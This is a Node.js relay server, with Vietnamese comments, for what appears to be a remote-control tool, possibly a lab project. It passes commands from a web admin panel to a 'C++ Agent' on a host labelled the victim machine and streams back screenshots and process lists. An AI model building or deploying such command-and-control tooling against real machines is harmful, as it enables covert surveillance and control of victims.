const WebSocket = require('ws');
const net = require('net');
const express = require('express'); 
const path = require('path');

// ================= CẤU HÌNH =================
const WEB_PORT = 3000;       
const WS_PORT = 8081;        
const CPP_PORT = 8888;       
const CPP_HOST = '10.29.66.11'; // Máy nạn nhân

// ================= 1. SETUP WEB SERVER (EXPRESS) =================
const app = express();
const clientPath = path.join(__dirname, '../client'); 

app.use(express.static(clientPath));

const server = app.listen(WEB_PORT, () => {
    console.log('----------------------------------------------------');
    console.log(`[WEB] 🌐 Giao diện Web đang chạy tại: http://localhost:${WEB_PORT}`);
    console.log('----------------------------------------------------');
});

// ================= 2. SETUP WEBSOCKET SERVER =================
const wss = new WebSocket.Server({ port: WS_PORT });
console.log(`[WS]  WebSocket Server đang lắng nghe tại port ${WS_PORT}...`);

let cppSocket = null;
let webClient = null;

// ================= 3. KẾT NỐI C++ AGENT (TCP) =================
function connectToCppAgent() {
    cppSocket = new net.Socket();
    
    // BIẾN QUAN TRỌNG: Dùng để gom các mảnh dữ liệu TCP
    let dataBuffer = ""; 

    console.log(`[TCP] ⏳ Đang kết nối đến C++ Agent (${CPP_HOST}:${CPP_PORT})...`);
    
    cppSocket.connect(CPP_PORT, CPP_HOST, () => {
        console.log('[TCP] ✅ Đã kết nối thành công với C++ Agent!');
        if (webClient) webClient.send("CMD_MSG:Core Connected");
    });

    cppSocket.on('data', (data) => {
        // Cộng dồn dữ liệu mới vào bộ đệm
        dataBuffer += data.toString();

        // --- TRƯỜNG HỢP 1: XỬ LÝ ẢNH (IMG_B64) ---
        // Nếu phát hiện đây là dữ liệu ảnh
        if (dataBuffer.startsWith("IMG_B64:")) {
            // Kiểm tra xem đã nhận đủ đến cuối file chưa (dựa vào __EOF__)
            if (dataBuffer.includes("__EOF__")) {
                // Xóa đuôi __EOF__ trước khi gửi
                const finalData = dataBuffer.replace("__EOF__", "");
                
                console.log(`[TCP >> WEB] 📸 Đã nhận đủ ảnh trọn vẹn (${finalData.length} bytes). Gửi Web...`);
                
                if (webClient && webClient.readyState === WebSocket.OPEN) {
                    webClient.send(finalData);
                }
                
                // Reset bộ đệm để đón dữ liệu mới
                dataBuffer = ""; 
            }
            // Nếu CHƯA thấy __EOF__, nghĩa là ảnh chưa gửi xong -> Không làm gì cả, tiếp tục đợi gói tiếp theo.
        } 
        
        // --- TRƯỜNG HỢP 2: CÁC LỆNH KHÁC (JSON_LIST, CMD_MSG...) ---
        // Các lệnh này thường ngắn và có ký tự xuống dòng (\n) ở cuối do Socket.cpp gửi
        else {
            // Nếu có ký tự xuống dòng hoặc buffer có dữ liệu ngắn (không phải ảnh)
            // Ta gửi luôn để đảm bảo độ trễ thấp nhất cho các lệnh start/stop
            if (dataBuffer.includes("\n") || dataBuffer.length < 1000) {
                 const msgStr = dataBuffer.trim();
                 
                 // Log phân loại cho đẹp
                 if (msgStr.startsWith("JSON_LIST:")) {
                    console.log(`[TCP >> WEB] 📋 Nhận danh sách Process.`);
                 } else if (msgStr.length > 0) {
                    console.log(`[TCP >> WEB] 💬 ${msgStr}`);
                 }

                 if (webClient && webClient.readyState === WebSocket.OPEN) {
                    webClient.send(msgStr);
                 }
                 
                 // Reset bộ đệm sau khi gửi xong
                 dataBuffer = "";
            }
        }
    });

    cppSocket.on('close', () => {
        console.log('[TCP] ❌ Mất kết nối C++. Thử lại sau 3s...');
        cppSocket = null;
        if (webClient) webClient.send("CMD_MSG:Core Disconnected");
        setTimeout(connectToCppAgent, 3000);
    });

    cppSocket.on('error', (err) => {
        // console.error('[TCP] Lỗi kết nối:', err.message);
    });
}

connectToCppAgent();

// ================= 4. XỬ LÝ KẾT NỐI TỪ WEB =================
wss.on('connection', (ws) => {
    console.log('[WS]  👤 Web Admin đã vào điều khiển!');
    webClient = ws;

    ws.on('message', (message) => {
        const cmd = message.toString();
        console.log(`[WEB >> TCP] ⌨️  Gửi lệnh: ${cmd}`);

        if (cppSocket && !cppSocket.destroyed) {
            cppSocket.write(cmd);
        } else {
            ws.send("CMD_MSG:Error - C++ Agent chưa kết nối!");
        }
    });

    ws.on('close', () => {
        console.log('[WS]  Web Admin đã thoát.');
        webClient = null;
    });
});